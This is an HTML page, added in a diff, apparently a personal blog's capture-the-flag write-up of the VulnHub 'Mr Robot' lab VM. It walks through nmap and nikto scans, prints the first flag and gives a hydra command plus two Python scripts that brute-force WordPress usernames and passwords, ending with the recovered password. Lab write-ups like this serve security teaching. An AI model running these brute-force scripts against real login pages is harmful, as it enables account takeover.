@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="viewport" content="width=device-width" , initial-scale=1, viewport-fit="cover">
+    <title>Mr Robot</title>
+    <meta name="description" content="Hints for the BACKDOOR CTF challenge">
+    <link rel="icon" type="image" href="../../../favicon.ico">
+    <link rel="stylesheet" type="text/css" href="../../../assets/bootstrap/css/bootstrap.min.css">
+    <link href='https://fonts.googleapis.com/css?family=ABeeZee' rel='stylesheet'>
+    <link href='https://fonts.googleapis.com/css?family=Belgrano' rel='stylesheet'>
+    <link href='https://fonts.googleapis.com/css?family=Ubuntu' rel='stylesheet'>
+    <link rel="stylesheet" type="text/css" href="style.css">
+</head>
+
+<body>
+    <div class="top-bar">
+        <ul>
+            <li><a href="https://github.com/DivyanshuSahu?tab=repositories">Projects</a></li>
+            <li><a href="#">Blogs</a></li>
+            <li><a href="../../index.html">Write-Ups</a></li>
+            <li><a href="../../../index.html">Home</a></li>
+        </ul>
+    </div>
+    <div class="container">
+        <div class="title">
+            <h1>VulnHubCTF - Mr Robot</h1>
+        </div>
+        <div class="date">
+            <p>6 December 2017</p>
+        </div>
+        <div class="challenge">
+            <div class="description">
+                <p><b>Description:</b></p>
+                <p>Based on the show, Mr. Robot. </p>
+                <p>This VM has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find. </p>
+                <p>The VM isn't too difficult. There isn't any advanced exploitation or reverse engineering. The level is considered beginner-intermediate. </p>
+            </div>
+            <div class="write-up">
+                <h3>Walkthrough</h3>
+                <p>As usual, first start with finding the ip address of the victim's machine using nmap. </p>
+                <div class="description code-snippet">
+                    <p>$ sudo nmap -v -sS -A -T4 192.168.56.1-255</p>
+                    <img src="files/1.png" alt="nmap-result">
+                </div>
+                <p>Here, we notice that victim's machine hosted a Apache web server at 192.168.56.101</p>
+                <img src="files/2.png" alt="web server">
+                <p>The website take some command as a input and display desired results, which does not seems to be useful. </p>
+                <p>Therefore as a good practice, I decided to check for robots.txt</p>
+                <div class="description code-snippet">
+                    <p>User-agent: *</p>
+                    <p>fsocity.dic</p>
+                    <p>key-1-of-3.txt</p>
+                </div>
+                <p>Here we already have your first flag inside <a href="files/key-1-of-3.txt">key-1-of-3.txt</a></p>
+                <p><b>Flag 1: 073403c8a58a1f80d943455fb30724b9</b></p>
+                <p>There is another file <a href="files/fsocity.dic">fsocity.dic</a>, which seems like a dictionary file. There are many words repeted in fsocity.dic, so I decided to filter it.</p>
+                <div class="description code-snippet">
+                    <p>$ wc -l fsocity.dic</p>
+                    <p>858160 fsocity.dic</p>
+                    <p>$ sort fsocity.dic | uniq | wc -l</p>
+                    <p>11415</p>
+                </div>
+                <p>But why we are provided with this dictionary file. Let's scan the web server for vulnerabilities using nikto.</p>
+                <div class="description code-snippet">
+                    <p>$ nikto -h http://192.168.56.101/</p>
+                    <img src="files/3.png" alt="nikto scan">
+                </div>
+                <p>On looking at /admin/index.html/ and /readme/ does not seems to be helpful.</p>
+                <p>But nikto result also shows about wordpress installation and /wp-login/ seems to be interesting.</p>
+                <p>Inside /wp-login/ we have a admin login page. Now we need the above found dictionary for bruteforcing the login credientials with hydra.</p>
+                <p>First we should check for valid usernames.</p>
+                <div class="description code-snippet">
+                    <p>$ hydra -L uniq.dic -p something 192.192.168.56.101 http-post-form '/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=Invalid username'</p>
+                    <img src="files/4.png" alt="hydra result">
+                </div>
+                <p>After some minutes we get three correct usernames <b>elliot, Elliot, ELLIOT</b>.</p>
+                <p>Alter, I also write a simple python script for bruteforcing.</p>
+                <div class="description code-snippet">
+                    import requests
+                    <br> import time
+                    <br><br> start = time.time()
+                    <br> target = 'http://192.168.56.101/wp-login.php'
+                    <br> unSucessfulStr = 'Invalid username'
+                    <br> count = 0
+                    <br> found = False
+                    <br>
+                    <br> with open('uniq.dic','rb') as f :
+                    <br>&emsp; for line in f:
+                    <br>&emsp;&emsp; password = 'something'
+                    <br>&emsp;&emsp; username = line.rstrip()
+                    <br>&emsp;&emsp; send = {'log':username, 'pwd':password, 'wp-submit':'Log In'}
+                    <br>&emsp;&emsp; r = requests.post(target, data=send)
+                    <br>&emsp;&emsp; count += 1
+                    <br>&emsp;&emsp; if count % 500 == 0 :
+                    <br>&emsp;&emsp;&emsp; current_time = time.time()
+                    <br>&emsp;&emsp;&emsp; print "[" + str((current_time-start))[:4] + "s] " + str(count) + " usernames tried"
+                    <br>&emsp;&emsp; if unSucessfulStr in r.text :
+                    <br>&emsp;&emsp;&emsp; continue
+                    <br>&emsp;&emsp; else :
+                    <br>&emsp;&emsp;&emsp; success_time = time.time() print "[" + str((success_time-start))[:4] + "s] username found : " + username
+                    <br>&emsp;&emsp;&emsp; found = True
+                    <br><br> if found == False :
+                    <br>&emsp; print "Username not found"
+                    <img src="files/5.png" alt="python code">
+                </div>
+                <p>Now it's time for bruteforcing the password.</p>
+                <div class="description code-snippet">
+                    import requests
+                    <br> import time
+                    <br><br> start = time.time()
+                    <br> target = 'http://192.168.56.101/wp-login.php'
+                    <br> unSucessfulStr = 'ERROR'
+                    <br> count = 0
+                    <br> found = False
+                    <br><br> with open('uniq.dic','rb') as f :
+                    <br>&emsp; for line in f:
+                    <br>&emsp;&emsp; password = line.rstrip()
+                    <br>&emsp;&emsp; username = 'elliot'
+                    <br>&emsp;&emsp; send = {'log':username, 'pwd':password, 'wp-submit':'Log In'}
+                    <br>&emsp;&emsp; r = requests.post(target, data=send)
+                    <br>&emsp;&emsp; count += 1
+                    <br>&emsp;&emsp; if count % 500 == 0 :
+                    <br>&emsp;&emsp;&emsp; current_time = time.time()
+                    <br>&emsp;&emsp;&emsp; print "[" + str((current_time-start))[:4] + "s] " + str(count) + " passwords tried"
+                    <br>&emsp;&emsp; if unSucessfulStr in r.text :
+                    <br>&emsp;&emsp;&emsp; continue
+                    <br>&emsp;&emsp; else :
+                    <br>&emsp;&emsp;&emsp; success_time = time.time()
+                    <br>&emsp;&emsp;&emsp; print "[" + str((success_time-start))[:4] + "s] Password found : " + password
+                    <br>&emsp;&emsp;&emsp; found = True
+                    <br>&emsp;&emsp;&emsp; break
+                    <br><br> if found == False :
+                    <br>&emsp; print "Password not found"
+                    <img src="files/6.png" alt="python code">
+                </div>
+                <p>Password is <b>ER28-0652</b></p>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
